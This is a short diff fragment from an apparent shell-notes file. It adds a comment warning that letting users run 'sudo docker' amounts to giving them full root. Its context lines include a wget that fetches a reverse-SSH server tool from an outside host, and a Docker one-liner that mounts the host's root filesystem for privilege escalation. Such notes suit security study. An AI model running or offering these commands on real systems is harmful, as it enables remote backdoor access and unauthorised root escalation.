@@ -41,5 +41,7 @@ wget -nv -O ~/.revssh http://hwi.ath.cx/jshtools/revsshserver
 ## From: https://fosterelli.co/privilege-escalation-via-docker.html
 docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
 
+## So if you give your users the ability to run `sudo docker` then you may as well give them `sudo` for everything!
+
 !!
 
